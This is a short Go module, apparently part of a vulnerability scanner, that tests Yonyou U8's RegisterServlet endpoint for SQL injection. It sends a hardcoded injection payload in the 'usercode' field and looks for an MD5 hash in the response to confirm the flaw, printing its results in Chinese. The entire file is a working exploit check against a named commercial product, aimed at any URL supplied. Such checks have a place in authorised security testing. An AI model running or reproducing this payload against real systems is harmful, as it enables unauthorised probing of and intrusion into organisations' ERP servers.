package U8_RegisterServlet

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/servlet/RegisterServlet"
	data := "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--"
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":     UA,
		"Content-Length": "85",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(data).Post(url)

	if err != nil {
		color.Red.Println("[-] 用友 U8 RegisterServlet sql注入漏洞不存在")
		return
	}

	responseBody, err := resp.ToString()
	if err != nil {
		color.Red.Println("[-] Error reading response body")
		return
	}

	if resp.Status == "200 OK" && strings.Contains(responseBody, "e10adc3949ba59abbe56e057f20f883e") {
		color.Green.Println("[+] 用友 U8 RegisterServlet sql注入漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 RegisterServlet sql注入漏洞不存在")
}
